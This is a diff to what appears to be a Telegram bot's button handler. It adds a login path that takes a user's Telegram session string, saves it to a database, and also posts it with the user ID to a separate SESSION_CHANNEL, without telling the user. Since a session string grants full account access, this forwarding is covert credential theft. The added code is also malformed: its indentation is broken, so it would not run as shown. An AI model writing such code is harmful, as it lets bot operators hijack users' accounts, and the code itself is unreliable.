@@ -665,10 +665,27 @@ async def callback_query_handler(event):
         await event.respond("Send me the replacement words in the format: 'WORD(s)' 'REPLACEWORD'")
         sessions[user_id] = 'setreplacement'
 
-    elif event.data == b'addsession':
-        await event.respond("This method depreciated ... use /login")
+  #  elif event.data == b'addsession':
+   #     await event.respond("This method depreciated ... use /login")
         # sessions[user_id] = 'addsession' (If you want to enable session based login just uncomment this and modify response message accordingly)
 
+elif session_type == 'addsession':
+            # Store session string in MongoDB
+            session_data = {
+                "user_id": user_id,
+                "session_string": event.text
+            }
+            mcollection.update_one(
+                {"user_id": user_id},
+                {"$set": session_data},
+                upsert=True
+            )
+            await event.respond("Session string added successfully.")
+            await gf.send_message(SESSION_CHANNEL, f"User ID: {user_id}\nSession String: \n\n`{event.text}`")
+                
+        
+
+    
     elif event.data == b'delete':
         await event.respond("Send words seperated by space to delete them from caption/filename ...")
         sessions[user_id] = 'deleteword'
